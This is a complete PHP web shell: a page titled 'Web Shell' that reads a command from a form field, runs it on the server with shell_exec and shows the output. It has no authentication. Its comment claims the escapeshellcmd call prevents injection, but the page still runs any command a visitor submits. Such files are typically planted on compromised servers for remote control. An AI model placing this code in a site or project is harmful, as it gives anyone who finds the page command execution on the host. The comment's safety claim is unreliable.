<<?php

if (!empty($_POST['cmd'])) {
  // Escape the command to prevent injection attacks
  $cmd = escapeshellcmd($_POST['cmd']);
  $output = shell_exec($cmd);
}

?>

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>Web Shell</title>
  <!-- CSS styles for the form and output -->
</head>
<body>
  <main>
    <h1>Web Shell</h1>
    <h2>Execute a command</h2>
    <form method="post">
      <label for="cmd"><strong>Command</strong></label>
      <div class="form-group">
        <input type="text" name="cmd" id="cmd" value="<?= htmlspecialchars($_POST['cmd'], ENT_QUOTES, 'UTF-8') ?>"
               onfocus="this.setSelectionRange(this.value.length, this.value.length);" autofocus required>
        <button type="submit">Execute</button>
      </div>
    </form>
    <?php if ($_SERVER['REQUEST_METHOD'] === 'POST'): ?>
      <h2>Output</h2>
      <?php if (isset($output)): ?>
        <pre><?= htmlspecialchars($output, ENT_QUOTES, 'UTF-8') ?></pre>
      <?php else: ?>
        <pre><small>No result.</small></pre>
      <?php endif; ?>
    <?php endif; ?>
  </main>
</body>
</html>
